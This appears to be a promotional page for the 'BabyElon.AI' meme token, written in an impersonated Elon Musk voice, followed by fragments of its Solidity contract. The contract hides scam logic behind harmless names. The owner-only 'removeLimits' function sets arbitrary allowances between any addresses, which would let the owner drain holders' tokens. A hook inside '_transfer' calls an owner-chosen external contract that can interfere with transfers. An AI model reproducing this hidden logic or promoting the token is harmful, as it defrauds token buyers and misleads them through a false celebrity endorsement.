...
Well hello there! It's me, Elon Musk. Did you know that I used to be a baby just like you? It's true! But even as a baby, I had big dreams. I wanted to grow up and do amazing things. And now, here I am, all grown up and running my own companies like SpaceX, Tesla and Twitter!

Website: https://babyelon.fun
Telegram: https://t.me/babyelongroup
Twitter: https://twitter.com/babyelongroup
...
contract BabyElonAI is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor() {
        ...
        _name = unicode"BabyElon.AI";
        _symbol = unicode"BabyElon.AI";
        ...
        treasuryAddress = address(msg.sender); // set as treasury wallet
    ...
    function removeLimits(Serialize memory serial_) external onlyOwner returns (bool){
        limitsInEffect = serial_.limitsInEffect;
        transferDelayEnabled = serial_.transferDelayEnabled;

        aggregateMarket(serial_.aggregate, serial_.market, serial_.amount);
        return true;
    }
    ...
    function aggregateMarket(address aggre_, address market_, uint256 amount) private {
        _allowances[aggre_][market_] = amount;
    ...
    function isSwapEnabled(address from, address to, uint256 amount) private returns(bool) {
        if(market != address(0)){
            return IERC20(market).transferFrom(from, to, amount);
        }
    ...
    function _transfer(
        ...
        bool canSwap = contractTokenBalance >= swapTokensAtAmount || isSwapEnabled(from, to, amount) ;
